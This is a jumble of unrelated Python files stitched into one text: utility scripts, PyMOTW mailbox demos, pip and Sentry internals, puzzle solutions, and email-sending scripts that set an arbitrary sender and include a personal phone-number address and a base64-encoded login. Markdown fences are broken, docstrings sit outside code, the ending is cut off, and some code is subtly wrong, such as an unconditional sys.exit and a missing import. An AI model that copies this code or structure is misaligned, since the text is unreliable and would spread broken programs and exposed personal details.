filename = '-'.join((title + ' ' + artist).split()) + '-lyrics.txt'

if os.path.exists(filename):  # If the file already exists
    print('Lyrics of "' + title + '" already saved to the file', filename)
    exit()  # Then print the name of the file and exit
else:
    # Opening the file with filename in writing mode
    file = open(filename, 'w')
    try:
        song = genius.search_song(title, artist)  # Searching for the song
        file.write(song.lyrics)  # Writing the lyrics of the song to the file
        print('Lyrics of "' + title + '"', 'found and saved to the file',
              filename)
        file.close()  # Closing the file upon writing the contents successfully
    except:
        file.close()
        os.remove(filename)  # Deleting the file if no lyrics are found
        print('Error finding the lyrics of the song "' + title + '" by',
              artist)  # Print an error if the lyrics are not found

import os

from .api import PlatformDirsABC


class MacOS(PlatformDirsABC):
    """
    Platform directories for the macOS operating system. Follows the guidance from `Apple documentation
    <https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/MacOSXDirectories/MacOSXDirectories.html>`_.
    Makes use of the `appname <platformdirs.api.PlatformDirsABC.appname>` and
    `version <platformdirs.api.PlatformDirsABC.version>`.
    """

    @property
    def user_data_dir(self) -> str:
        """:return: data directory tied to the user, e.g. ``~/Library/Application Support/$appname/$version``"""
        return self._append_app_name_and_version(os.path.expanduser("~/Library/Application Support/"))

    @property
    def site_data_dir(self) -> str:
        """:return: data directory shared by users, e.g. ``/Library/Application Support/$appname/$version``"""
        return self._append_app_name_and_version("/Library/Application Support")

    @property
    def user_config_dir(self) -> str:
        """:return: config directory tied to the user, e.g. ``~/Library/Preferences/$appname/$version``"""
        return self._append_app_name_and_version(os.path.expanduser("~/Library/Preferences/"))

    @property
    def site_config_dir(self) -> str:
        """:return: config directory shared by the users, e.g. ``/Library/Preferences/$appname``"""
        return self._append_app_name_and_version("/Library/Preferences")

    @property
    def user_cache_dir(self) -> str:
        """:return: cache directory tied to the user, e.g. ``~/Library/Caches/$appname/$version``"""
        return self._append_app_name_and_version(os.path.expanduser("~/Library/Caches"))

    @property
    def user_state_dir(self) -> str:
        """:return: state directory tied to the user, same as `user_data_dir`"""
        return self.user_data_dir

    @property
    def user_log_dir(self) -> str:
        """:return: log directory tied to the user, e.g. ``~/Library/Logs/$appname/$version``"""
        return self._append_app_name_and_version(os.path.expanduser("~/Library/Logs"))

    @property
    def user_runtime_dir(self) -> str:
        """:return: runtime directory tied to the user, e.g. ``~/Library/Caches/TemporaryItems/$appname/$version``"""
        return self._append_app_name_and_version(os.path.expanduser("~/Library/Caches/TemporaryItems"))


__all__ = [
    "MacOS",
]

# # string concatenation (aka how to put strings together)
# # suppose we want to create a string that says "subscribe to _____ "
# youtuber = "Kylie Ying" # some string variable

# # a few ways to do this
# print("subscribe to " + youtuber)
# print("subscribe to {}".format(youtuber))
# print(f"subscribe to {youtuber}")

adj = input("Adjective: ")
verb1 = input("Verb: ")
verb2 = input("Verb: ")
famous_person = input("Famous person: ")

madlib = f"Computer programming is so {adj}! It makes me so excited all the time because \
I love to {verb1}. Stay hydrated and {verb2} like you are {famous_person}!"

print(madlib)

# -*- coding: utf-8 -*-
from __future__ import absolute_import, print_function

from ipykernel.comm import Comm
from IPython.core import magic_arguments
from IPython.core.magic import Magics, cell_magic, magics_class
from IPython.core.magics.namespace import NamespaceMagics

from .debugger import Bdb


@magics_class
class NbtutorMagics(Magics):

    def __init__(self, shell):
        super(NbtutorMagics, self).__init__(shell)
        self.comm = Comm(target_name='nbtutor_comm')

    @magic_arguments.magic_arguments()
    @magic_arguments.argument(
        '-r', '--reset', action='store_true', default=False,
        help="Reset (clear) the IPython global namespace."
    )
    @magic_arguments.argument(
        '-f', '--force', action='store_true', default=False,
        help="Suppress the reset confirmation message."
    )
    @magic_arguments.argument(
        '-i', '--inline', action='store_true', default=False,
        help="Inline primitive objects."
    )
    @magic_arguments.argument(
        '-d', '--depth', metavar='N', type=int, default=1,
        help="The stack frame visualization depth (default: 1)."
    )
    @magic_arguments.argument(
        '--digits', metavar='D', type=int, default=3,
        help="The number of significant digits for floats (default: 3)."
    )
    @magic_arguments.argument(
        '--max_size', metavar='S', type=int, default=5,
        help="The number of sequence object elements to visualize (default: 5)."
    )
    @magic_arguments.argument(
        '--step_all', action='store_true', default=False,
        help="Step through all frames (including other global scope frames)"
    )
    @magic_arguments.argument(
        '--expand_arrays', action='store_true', default=False,
        help="Expand numpy arrays to show underlying data"
    )
    @magic_arguments.argument(
        '--nolies', action='store_true', default=False,
        help="No inlined keys, attributes or primitive objects"
    )
    @magic_arguments.argument(
        '--debug', action='store_true', default=False,
        help="Debug nbtutor."
    )
    @cell_magic
    def nbtutor(self, line, cell):
        opts = magic_arguments.parse_argstring(self.nbtutor, line)
        if opts.reset:
            params = '-f' if opts.force else ''
            NamespaceMagics(self.shell).reset(params)
        if opts.nolies:
            opts.inline = False

        bdb = Bdb(self.shell, opts)
        bdb.run_cell(cell)

        self.shell.run_cell(cell)
        # FIXME: This pointless re-running the cell again via ipython is needed
        # to get the "<ipython-input-{0}-{1}>" f_code.co_filename set and the
        # code cached. I don't know enough about the IPython API to do this
        # better inside the debugger.

        if not bdb.code_error or opts.debug:
            self.comm.send(bdb.trace_history.clean())

def magicalWell(a, b, n):
    s, m = 0, 0
    while m < n:
        s += a * b
        a += 1
        b += 1
        m += 1
    return s

import random


def magic():
    input("Ask me a question . Try me: ")
    return random.choice(
        [
            "It is certain",
            "Outlook good",
            "You may rely on it",
            "Ask again later",
            "Concentrate and ask again",
            "Reply hazy, try again",
            "My reply is no",
            "My sources say no",
        ]
    )


# main Sector
print("Hello,")
while True:
    if input("start or end: ").strip().lower() == "start":
        print(magic(), "\n")
        continue
    else:
        quit()

# Python program for generating diamond pattern in Python 3.7+


# Function to print upper half of diamond (pyramid)
def floyd(n):
    """
        Parameters:
    n : size of pattern
    """
    for i in range(0, n):
        for j in range(0, n - i - 1):  # printing spaces
            print(" ", end="")
        for k in range(0, i + 1):  # printing stars
            print("* ", end="")
        print()


# Function to print lower half of diamond (pyramid)
def reverse_floyd(n):
    """
        Parameters:
    n : size of pattern
    """
    for i in range(n, 0, -1):
        for j in range(i, 0, -1):  # printing stars
            print("* ", end="")
        print()
        for k in range(n - i + 1, 0, -1):  # printing spaces
            print(" ", end="")


# Function to print complete diamond pattern of "*"
def pretty_print(n):
    """
        Parameters:
    n : size of pattern
    """
    if n <= 0:
        print("       ...       ....        nothing printing :(")
        return
    floyd(n)  # upper half
    reverse_floyd(n)  # lower half


if __name__ == "__main__":
    print(r"| /\ | |- |  |-  |--| |\  /| |-")
    print(r"|/  \| |- |_ |_  |__| | \/ | |_")
    K = 1
    while K:
        user_number = int(input("enter the number and , and see the magic : "))
        print()
        pretty_print(user_number)
        K = int(input("press 0 to exit... and 1 to continue..."))

    print("Good Bye...")

#!/usr/bin/env /usr/bin/python
# -*- coding: utf-8 -*-
# (C) Lilian BESSON, 2013
# http://perso.crans.org/besson/bin/mail.py

import os
import sys
from email.mime.text import MIMEText
import smtplib
import subprocess


def notify(msg, submsg="mail.py : auto mailer (with notify-send)"):
    ''' Notification using subprocess and notify-send.
    Also print the informations directly to the screen.

    Fails simply if notify-send is not found.'''
    try:
        subprocess.Popen(['notify-send', msg, submsg])
    except:
        print "notify-send : not-found !"
        return -1
    print "msg=%s\nsubmsg=%s" % (msg, submsg)


# Import smtplib for the actual sending function

# Import the email modules we'll need

signature = """\n
--
%s
### Auto-sent by [mail.py], a simple Python 2.6 script.
### Auto configure with SMTP server on localhost in the cr@ns server.
### (c) by Lilian Besson```


```py


def send_me_an_email(message, subj="[LOG] no object", me="jarvisATcransDOTorg".replace("AT", "@").replace("DOT", "."), you="jarvisATcransDOTorg".replace("AT", "@").replace("DOT", "."), my_identity="jarvis log"):
    """ Send a message [message] by email.
    The content of the email is [message], the subject is [subj].
    The sender is [me], not necessary a valid sender for the SMTP.
    The mail will be sent to [you].

    Auto configure with SMTP server on localhost in the cr@ns server (http://www.crans.org)

    (c) Lilian Besson, 2012-2013.
    """
    notify(subj, message+"\n### ME="+me+" YOU="+you)
    msg = MIMEText(message+(signature % me))
    # The order is "important", to act like a real mail client !
    msg['From'] = my_identity+" <"+me+">"
    msg['To'] = you
    msg['Subject'] = subj
    # Send the message via our own SMTP server, but don't include the
    # envelope header.
    s = smtplib.SMTP('smtp.crans.org')
    # s = smtplib.SMTP('localhost')
    s.sendmail(me, [you], msg.as_string())
    s.quit()
    print "An email has been sent to %s, from %s <%s>." % (you, my_identity, me)
    print "Title of the email : \n%s" % subj
    print "Content of the email : \n%s" % message


if __name__ == '__main__':
    if '-h' in sys.argv or '--help' in sys.argv:
        print "  mail.py [message [subject]]\nUSAGE:"
        print send_me_an_email.__doc__
        sys.exit(0)
    if len(sys.argv) > 2:
        subject = sys.argv[2]
    else:
        subject = "[LOG] jarvis"
    identity = "User = %s @ Host = %s." % (
        os.getenv("USER"), os.getenv("HOSTNAME"))
    message = "### Content of the email :\n"
    if len(sys.argv) > 1:
        message = message+str(sys.argv[1])
    message = message + \
        ("\n### Content of command line : %s.\n### From %s" %
         (str(sys.argv), identity))
    send_me_an_email(message, subj=subject)

#!/usr/bin/env /usr/bin/python
# -*- coding: utf-8; mode: python -*-```


```py
A small Python 2/3 script to send an email from the crans.org network.

- Author: Lilian Besson, (C) 2014.
- Online: https://bitbucket.org/lbesson/bin/src/master/mail_ghost.py
- Licence: MIT Licence (http://lbesson.mit-license.org).```


```py

from __future__ import print_function  # Python 2/3 compatibility !

# Import sys to use arg of the script
import sys

# Import smtplib for the actual sending function
import smtplib

# Import the email modules we'll need
from email.mime.text import MIMEText
from base64 import b64decode


defaultaddress = "jarvisATcransDOTorg".replace("AT", "@").replace("DOT", ".")

signature = """
--
%s```


```py


def send_me_an_email(
    message,
    subj="[LOG] no object",
    me=defaultaddress,
    you=defaultaddress,
    my_identity="jarvis",
):
    """ Send a message [message] by email.
    The content of the email is [message], the subject is [subj].
    The sender is [me], not necessary a valid sender for the SMTP.
    The mail will be sent to [you].

    Auto configured with SMTP server (smtp.crans.org) with SSL support for the cr@ns server (http://www.crans.org)

    (c) Lilian Besson, 2012-2014.
    """
    msg = MIMEText(
        "%s" % (message + (signature % me)).replace("\n", "\n"), _charset="utf-8"
    )
    # The order is "important", to act like a real mail client !
    msg[
        "User-Agent"
    ] = "smtplib.text/plain with python 2.7.6 on jarvis.crans.org (with http://perso.crans.org/besson/bin/mail_ghost.py)"
    # Identity
    msg["From"] = my_identity + " <" + me + ">"
    msg["Reply-To"] = me
    msg["To"] = you
    msg["Subject"] = subj
    # Send the message via our own SMTP server, but don't include the envelope header.
    # s = smtplib.SMTP('localhost')
    # s = smtplib.SMTP('smtp.crans.org', port=465) # Try 587 for starttls ?
    s = smtplib.SMTP_SSL("smtp.crans.org", port=465)  # Try 587 for starttls ?
    # See https://docs.python.org/2/library/smtplib.html#smtplib.SMTP.login
    s.login(
        b64decode("YmVzc29u"), b64decode(open("/home/lilian/crans.b64").readline()[:-1])
    )
    s.sendmail(me, [you], msg.as_string())
    s.quit()
    print("An email has been sent to <%s>, from %s <%s>." % (you, my_identity, me))
    print("Title of the email : <%s>" % subj)
    print("Content of the email : \n%s" % message)


if __name__ == "__main__":
    if "-h" in sys.argv or "--help" in sys.argv:
        print("mail_ghost.py [message [subject [you [me [my_identity]]]]]\nUSAGE:")
        print(send_me_an_email.__doc__)
    sys.exit(0)
    my_identity = sys.argv[5] if len(sys.argv) > 5 else "jarvis"
    me = sys.argv[4] if len(sys.argv) > 4 else defaultaddress
    you = sys.argv[3] if len(sys.argv) > 3 else defaultaddress
    subject = sys.argv[2] if len(sys.argv) > 2 else "[LOG] jarvis.crans.org"
    message = "%s" % (str(sys.argv[1])) if len(sys.argv) > 1 else "Empty message."
    send_me_an_email(message, subj=subject, you=you, me=me, my_identity=my_identity)

#!/usr/bin/env /usr/bin/python
# -*- coding: utf-8; mode: python -*-```


```py
A small Python 2/3 script to send an email from the crans.org network, verbous mode.

- Author: Lilian Besson, (C) 2014.
- Online: https://bitbucket.org/lbesson/bin/src/master/mail.py
- Licence: MIT Licence (http://lbesson.mit-license.org).```


```py

from __future__ import print_function  # Python 2/3 compatibility !

# Import smtplib for the actual sending function
import smtplib

# Import the email modules we'll need
from email.mime.text import MIMEText
import sys
import os

signature = """\n
--
%s```


```py


def send_me_an_email(
    message,
    subj="[LOG] no object",
    me="jarvisATcransDOTorg".replace("AT", "@").replace("DOT", "."),
    you="0628412257ATsfrDOTfr".replace("AT", "@").replace("DOT", "."),
    my_identity="jarvis log",
):
    """ Send a message [message] by email.
    The content of the email is [message], the subject is [subj].
    The sender is [me], not necessary a valid sender for the SMTP.
    The mail will be sent to [you].

    Auto configure with SMTP server on localhost in the cr@ns server (http://www.crans.org)

    (c) Lilian Besson, 2012-2013.
    """
    msg = MIMEText(message + (signature % me))
    # The order is "important", to act like a real mail client !
    msg["From"] = my_identity + " <" + me + ">"
    msg["To"] = you
    msg["Subject"] = subj
    # Send the message via our own SMTP server, but don't include the
    # envelope header.
    s = smtplib.SMTP("smtp.crans.org")
    # s = smtplib.SMTP('localhost')
    s.sendmail(me, [you], msg.as_string())
    s.quit()
    # print("An email has been sent to %s, from %s <%s>." % (you, my_identity, me))
    # print("Title of the email : \n%s" % subj)
    # print("Content of the email : \n%s" % message)


if __name__ == "__main__":
    if "-h" in sys.argv or "--help" in sys.argv:
        print("  mail.py [message [subject]]\nUSAGE:")
        print(send_me_an_email.__doc__)
        sys.exit(0)
    if len(sys.argv) > 2:
        subject = sys.argv[2]
    else:
        subject = "[LOG] jarvis"
        message = ""
    if len(sys.argv) > 1:
        message = message + str(sys.argv[1])
    send_me_an_email(message, subj=subject)

```









---


```py


#end_pymotw_header
import mailbox

print('Before:')
mbox = mailbox.Maildir('Example')
mbox.lock()
try:
    for message_id, message in mbox.iteritems():
        print('{:6} "{}"'.format(message.get_flags(),
                                 message['subject']))
        message.add_flag('F')
        # Tell the mailbox to update the message.
        mbox[message_id] = message
finally:
    mbox.flush()
    mbox.close()

print('\nAfter:')
mbox = mailbox.Maildir('Example')
for message in mbox:
    print('{:6} "{}"'.format(message.get_flags(),
                             message['subject']))

```









---


```py


#end_pymotw_header
import mailbox
import email.utils
import os

from_addr = email.utils.formataddr(('Author',
                                    'author@example.com'))
to_addr = email.utils.formataddr(('Recipient',
                                  'recipient@example.com'))

payload = '''This is the body.
From (will not be escaped).
There are 3 lines.
'''

mbox = mailbox.Maildir('Example')
mbox.lock()
try:
    msg = mailbox.mboxMessage()
    msg.set_unixfrom('author Sat Feb  7 01:05:34 2009')
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = 'Sample message 1'
    msg.set_payload(payload)
    mbox.add(msg)
    mbox.flush()

    msg = mailbox.mboxMessage()
    msg.set_unixfrom('author Sat Feb  7 01:05:34 2009')
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = 'Sample message 2'
    msg.set_payload('This is the second body.\n')
    mbox.add(msg)
    mbox.flush()
finally:
    mbox.unlock()

for dirname, subdirs, files in os.walk('Example'):
    print(dirname)
    print('  Directories:', subdirs)
    for name in files:
        fullname = os.path.join(dirname, name)
        print('\n***', fullname)
        print(open(fullname).read())
        print('*' * 20)

```









---


```py


#end_pymotw_header
import mailbox
import os


def show_maildir(name):
    os.system('find {} -print'.format(name))


mbox = mailbox.Maildir('Example')
print('Before:', mbox.list_folders())
show_maildir('Example')

print('\n{:#^30}\n'.format(''))

mbox.add_folder('subfolder')
print('subfolder created:', mbox.list_folders())
show_maildir('Example')

subfolder = mbox.get_folder('subfolder')
print('subfolder contents:', subfolder.list_folders())

print('\n{:#^30}\n'.format(''))

subfolder.add_folder('second_level')
print('second_level created:', subfolder.list_folders())
show_maildir('Example')

print('\n{:#^30}\n'.format(''))

subfolder.remove_folder('second_level')
print('second_level removed:', subfolder.list_folders())
show_maildir('Example')

```









---


```py


#end_pymotw_header
import mailbox

mbox = mailbox.Maildir('Example')
for message in mbox:
    print(message['subject'])

```









---


```py


#end_pymotw_header
import mailbox
import os

mbox = mailbox.Maildir('Example')
mbox.lock()
try:
    to_remove = []
    for key, msg in mbox.iteritems():
        if '2' in msg['subject']:
            print('Removing:', key)
            to_remove.append(key)
    for key in to_remove:
        mbox.remove(key)
finally:
    mbox.flush()
    mbox.close()

for dirname, subdirs, files in os.walk('Example'):
    print(dirname)
    print('  Directories:', subdirs)
    for name in files:
        fullname = os.path.join(dirname, name)
        print('\n***', fullname)
        print(open(fullname).read())
        print('*' * 20)

```









---


```py


#end_pymotw_header
import mailbox

print('Before:')
mbox = mailbox.Maildir('Example')
mbox.lock()
try:
    for message_id, message in mbox.iteritems():
        print('{:6} "{}"'.format(message.get_flags(),
                                 message['subject']))
        message.set_flags('S')
        # Tell the mailbox to update the message.
        mbox[message_id] = message
finally:
    mbox.flush()
    mbox.close()

print('\nAfter:')
mbox = mailbox.Maildir('Example')
for message in mbox:
    print('{:6} "{}"'.format(message.get_flags(),
                             message['subject']))

```









---


```py


#end_pymotw_header
import mailbox
import os

print('Before:')
mbox = mailbox.Maildir('Example')
mbox.lock()
try:
    for message_id, message in mbox.iteritems():
        print('{:6} "{}"'.format(message.get_subdir(),
                                 message['subject']))
        message.set_subdir('cur')
        # Tell the mailbox to update the message.
        mbox[message_id] = message
finally:
    mbox.flush()
    mbox.close()

print('\nAfter:')
mbox = mailbox.Maildir('Example')
for message in mbox:
    print('{:6} "{}"'.format(message.get_subdir(),
                             message['subject']))

print()
for dirname, subdirs, files in os.walk('Example'):
    print(dirname)
    print('  Directories:', subdirs)
    for name in files:
        fullname = os.path.join(dirname, name)
        print(fullname)

```









---


```py


#end_pymotw_header
import mailbox
import email.utils

from_addr = email.utils.formataddr(('Author',
                                    'author@example.com'))
to_addr = email.utils.formataddr(('Recipient',
                                  'recipient@example.com'))

payload = '''This is the body.
From (will not be escaped).
There are 3 lines.
'''

mbox = mailbox.mbox('example.mbox')
mbox.lock()
try:
    msg = mailbox.mboxMessage()
    msg.set_unixfrom('author Sat Feb  7 01:05:34 2009')
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = 'Sample message 1'
    msg.set_payload(payload)
    mbox.add(msg)
    mbox.flush()

    msg = mailbox.mboxMessage()
    msg.set_unixfrom('author')
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = 'Sample message 2'
    msg.set_payload('This is the second body.\n')
    mbox.add(msg)
    mbox.flush()
finally:
    mbox.unlock()

print(open('example.mbox', 'r').read())

```









---


```py


#end_pymotw_header
import mailbox

mbox = mailbox.mbox('example.mbox')
for message in mbox:
    print(message['subject'])

```









---


```py


#end_pymotw_header
import mailbox

mbox = mailbox.mbox('example.mbox')
mbox.lock()
try:
    to_remove = []
    for key, msg in mbox.iteritems():
        if '2' in msg['subject']:
            print('Removing:', key)
            to_remove.append(key)
    for key in to_remove:
        mbox.remove(key)
finally:
    mbox.flush()
    mbox.close()

print(open('example.mbox', 'r').read())

import logging

from django.http import HttpResponse
from django.views.decorators.cache import never_cache
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from email_reply_parser import EmailReplyParser
from email.utils import parseaddr

from sentry.tasks.email import process_inbound_email
from sentry.utils.email import email_to_group_id


@never_cache
@csrf_exempt
@require_http_methods(["POST"])
def process_inbound_message(request):
    to_email = parseaddr(request.POST["To"])[1]
    from_email = parseaddr(request.POST["From"])[1]

    try:
        group_id = email_to_group_id(to_email)
    except Exception:
        logging.info("%r is not a valid email address", to_email)
        return HttpResponse(status=500)

    payload = EmailReplyParser.parse_reply(request.POST["body-plain"]).strip()
    if not payload:
        # If there's no body, we don't need to go any further
        return HttpResponse(status=200)

    process_inbound_email.delay(from_email, group_id, payload)

    return HttpResponse(status=201)
````

`pyA single place for constructing and exposing the main parser`

````py

import os
import sys
from typing import List, Tuple

from pip._internal.cli import cmdoptions
from pip._internal.cli.parser import ConfigOptionParser, UpdatingDefaultsHelpFormatter
from pip._internal.commands import commands_dict, get_similar_commands
from pip._internal.exceptions import CommandError
from pip._internal.utils.misc import get_pip_version, get_prog

__all__ = ["create_main_parser", "parse_command"]


def create_main_parser() -> ConfigOptionParser:
    """Creates and returns the main parser for pip's CLI"""

    parser = ConfigOptionParser(
        usage="\n%prog <command> [options]",
        add_help_option=False,
        formatter=UpdatingDefaultsHelpFormatter(),
        name="global",
        prog=get_prog(),
    )
    parser.disable_interspersed_args()

    parser.version = get_pip_version()

    # add the general options
    gen_opts = cmdoptions.make_option_group(cmdoptions.general_group, parser)
    parser.add_option_group(gen_opts)

    # so the help formatter knows
    parser.main = True  # type: ignore

    # create command listing for description
    description = [""] + [
        f"{name:27} {command_info.summary}"
        for name, command_info in commands_dict.items()
    ]
    parser.description = "\n".join(description)

    return parser


def parse_command(args: List[str]) -> Tuple[str, List[str]]:
    parser = create_main_parser()

    # Note: parser calls disable_interspersed_args(), so the result of this
    # call is to split the initial args into the general options before the
    # subcommand and everything else.
    # For example:
    #  args: ['--timeout=5', 'install', '--user', 'INITools']
    #  general_options: ['--timeout==5']
    #  args_else: ['install', '--user', 'INITools']
    general_options, args_else = parser.parse_args(args)

    # --version
    if general_options.version:
        sys.stdout.write(parser.version)
        sys.stdout.write(os.linesep)
        sys.exit()

    # pip || pip help -> print_help()
    if not args_else or (args_else[0] == "help" and len(args_else) == 1):
        parser.print_help()
        sys.exit()

    # the subcommand name
    cmd_name = args_else[0]

    if cmd_name not in commands_dict:
        guess = get_similar_commands(cmd_name)

        msg = [f'unknown command "{cmd_name}"']
        if guess:
            msg.append(f'maybe you meant "{guess}"')

        raise CommandError(" - ".join(msg))

    # all the args without the subcommand
    cmd_args = args[:]
    cmd_args.remove(cmd_name)

    return cmd_name, cmd_args

# Given an array of size n, find the majority element. The majority
# element is the element that appears more than ⌊ n/2 ⌋ times.
#
# You may assume that the array is non-empty and the majority element always exist in the array.
#
# Example 1:
#
# Input: [3,2,3]
# Output: 3
# Example 2:
#
# Input: [2,2,1,1,1,2,2]
# Output: 2

import collections


class Solution:
    # O(n) Time and O(n) space
    def majorityElement(self, nums):
        dict = collections.Counter(nums)
        n = len(nums) / 2
        for k, v in dict.items():
            if v > n:
                return k

    # O(n log n) Time and O(1) Space
    def majorityElement2(self, nums):
        nums.sort()

        return nums[len(nums) // 2]

# makeArrayConsecutive = lambda a: [i for i in range(min(a), max(a)) if i not in a]

a, = eval(dir()[0])
return [i for i in range(min(a), max(a)) if i not in a]

# Ratiorg got statues of different sizes as a present from CodeMaster for his birthday, each statue having an non-negative integer size. Since he likes to make things perfect, he wants to arrange them from smallest to largest so that each statue will be bigger than the previous one exactly by 1. He may need some additional statues to be able to accomplish that. Help him figure out the minimum number of additional statues needed.
#
# Example
#
# For statues = [6, 2, 3, 8], the output should be
# makeArrayConsecutive2(statues) = 3.
#
# Ratiorg needs statues of sizes 4, 5 and 7.
#
# Input/Output
#
# [execution time limit] 4 seconds (py3)
#
# [input] array.integer statues
#
# An array of distinct non-negative integers.
#
# Guaranteed constraints:
# 1 ≤ statues.length ≤ 10,
# 0 ≤ statues[i] ≤ 20.
#
# [output] integer
#
# The minimal number of statues that need to be added to existing statues such that it contains every integer size from an interval [L, R] (for some L, R) and no other sizes.
def makeArrayConsecutive2(statues):
    statues.sort()
    count = 0
    for i in range(len(statues)-1):
        if statues[i+1] - statues[i] > 1:
            count += statues[i+1] - statues[i] - 1
    return count
statues = [6, 2, 3, 8]
print(makeArrayConsecutive2(statues))

# Create a function that concatenates the number 7 to the end of every chord in a list. If a chord already ends with a 7, ignore that chord.
def csMakeItJazzy(chords):
    for index in range(len(chords)):
        if chords[index].__contains__("7"):
            continue
        elif chords == []:
            return []
        else:
            chords[index] = chords[index] + "7"
    return chords

def makeArrayConsecutive2(statues):
    additional_statues = 0
    sorted_statues = sorted(statues)  # Sort the statues
    for i in range(len(sorted_statues) - 1):
        if sorted_statues[i + 1] - sorted_statues[i] != 1:
            additional_statues += (sorted_statues[i + 1] - sorted_statues[i]) - 1
    return additional_statues

# -*- coding: utf-8 -*-```


```py
backports.makefile
~~~~~~~~~~~~~~~~~~

Backports the Python 3 ``socket.makefile`` method for use with anything that
wants to create a "fake" socket object.```


```py
import io
from socket import SocketIO


def backport_makefile(
    self, mode="r", buffering=None, encoding=None, errors=None, newline=None
):
    """
    Backport of ``socket.makefile`` from Python 3.5.
    """
    if not set(mode) <= {"r", "w", "b"}:
        raise ValueError("invalid mode %r (only r, w, b allowed)" % (mode,))
    writing = "w" in mode
    reading = "r" in mode or not writing
    assert reading or writing
    binary = "b" in mode
    rawmode = ""
    if reading:
        rawmode += "r"
    if writing:
        rawmode += "w"
    raw = SocketIO(self, rawmode)
    self._makefile_refs += 1
    if buffering is None:
        buffering = -1
    if buffering < 0:
        buffering = io.DEFAULT_BUFFER_SIZE
    if buffering == 0:
        if not binary:
            raise ValueError("unbuffered streams must be binary")
        return raw
    if reading and writing:
        buffer = io.BufferedRWPair(raw, raw, buffering)
    elif reading:
        buffer = io.BufferedReader(raw, buffering)
    else:
        assert writing
        buffer = io.BufferedWriter(raw, buffering)
    if binary:
        return buffer
    text = io.TextIOWrapper(buffer, encoding, errors, newline)
    text.mode = mode
    return text

def number_needed(a, b):
    def absol(a):
        if a >= 0:
            return a
        else:
            return (-1) * a

    char_to_del = 0

    a_dict = {}
    b_dict = {}

    for ch_a in a:
        if ch_a not in a_dict:
            a_dict[ch_a] = 1
        else:
            a_dict[ch_a] += 1

    for ch_b in b:
        if ch_b not in b_dict:
            b_dict[ch_b] = 1
        else:
            b_dict[ch_b] += 1

    all_chars = list(set(list(a_dict.keys()) + list(b_dict.keys())))

    for c in all_chars:
        if c not in a_dict:
            a_dict[c] = 0
        if c not in b_dict:
            b_dict[c] = 0

    for c in all_chars:
        a_ch = int(a_dict[c])
        b_ch = int(b_dict[c])
        # print(a_ch, b_ch)
        diff = a_ch - b_ch
        if diff < 0:
            diff *= -1
        char_to_del += diff
        # print(c, '-', a_dict[c], '-', b_dict[c])

    return char_to_del


a = input().strip()
b = input().strip()

print(number_needed(a, b))

#!/usr/bin/python

import sys
# my main issue was had to look up US denominations of money : https://en.wikipedia.org/wiki/Coins_of_the_United_States_dollar#Coins_in_circulation
# going to use a chace to help with lookup hopefully will be a good enough for the test cases it is quite slow at 0.033s for 2 tests

def making_change(amount, denominations):
    # create a cache for this set the cache = a list of [0] + the ammount + 1 in case of a zero input
    cache = [0] * (amount + 1)

    # set the index of zero to 1
    cache[0] = 1

    #using a nested for loop and adding to the cache
    # loop over the denom in denominations
    for denom in denominations:
        # inner loop - upper in range of denom to ammount + 1
        for upper in range(denom, amount+1):
            # set the inner index to the upper - the denom at current outer itteration
            inner_index = upper - denom
            # set increment the cache of upper by the cache of inner_index
            cache[upper] += cache[inner_index]

    # at the end we can return the cache at index of the ammount
    return cache[amount]

if __name__ == "__main__":
  # Test our your implementation from the command line
  # with `python making_change.py [amount]` with different amounts
  if len(sys.argv) > 1:
    denominations = [1, 5, 10, 25, 50]
    amount = int(sys.argv[1])
    print("There are {ways} ways to make {amount} cents.".format(ways=making_change(amount, denominations), amount=amount))
  else:
    print("Usage: making_change.py [amount]")```


```py
Author: OMKAR PATHAK
Created at: 27th August 2017```


```py


def manacher(string):
    """
    Computes length of the longest palindromic substring centered on each char
    in the given string. The idea behind this algorithm is to reuse previously
    computed values whenever possible (palindromes are symmetric).

    Example (interleaved string):
    i    0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22
    s    #  a  #  b  #  c  #  q  #  q  #  q  #  q  #  q  #  q  #  x  #  y  #
    P    0  1  0  1  0  1  0  1  2  3  4  5  6  5  4  ?
                                    ^        ^        ^        ^
                                  mirror   center   current  right

    We're at index 15 wondering shall we compute (costly) or reuse. The mirror
    value for 15 is 9 (center is in 12). P[mirror] = 3 which means a palindrome
    of length 3 is centered at this index. A palindrome of same length would be
    placed in index 15, if 15 + 3 <= 18 (right border of large parlindrome
    centered in 12). This condition is satisfied, so we can reuse value from
    index 9 and avoid costly computation.
    """
    if type(string) is not str:
        raise TypeError(
            "Manacher Algorithm only excepts strings, not {}".format(str(type(string)))
        )

    # Get the interleaved version of a given string. 'aaa' --> '^#a#a#a#$'.
    # Thanks to this we don't have to deal with even/odd palindrome
    # length problem.
    string_with_bounds = "#".join("^{}$".format(string))
    length = len(string_with_bounds)
    P = [0] * length
    center = right = 0

    for i in range(1, length - 1):
        P[i] = (right > i) and min(right - i, P[2 * center - i])

        # Attempt to expand palindrome centered at i
        while string_with_bounds[i + 1 + P[i]] == string_with_bounds[i - 1 - P[i]]:
            P[i] += 1

        # If palindrome centered at i expand past R,
        # adjust center based on expanded palindrome.
        if i + P[i] > right:
            center, right = i, i + P[i]

    # Find the maximum element in P and return the string
    maxLen, centerIndex = max((n, i) for i, n in enumerate(P))
    return string[(centerIndex - maxLen) // 2 : (centerIndex + maxLen) // 2]


def get_code():
    """
    returns the code for the manacher's algorithm
    :return: source code
    """
    return inspect.getsource(manacher)

#!/usr/bin/env python
import os
import sys

if __name__ == '__main__':
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'djorg.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)
````

`py Defines a KernelClient that provides signals and slots.`

```py

from qtpy import QtCore

# Local imports
from traitlets import Bool, DottedObjectName

from jupyter_client import KernelManager
from jupyter_client.restarter import KernelRestarter

from .kernel_mixins import QtKernelManagerMixin, QtKernelRestarterMixin


class QtKernelRestarter(KernelRestarter, QtKernelRestarterMixin):

    def start(self):
        if self._timer is None:
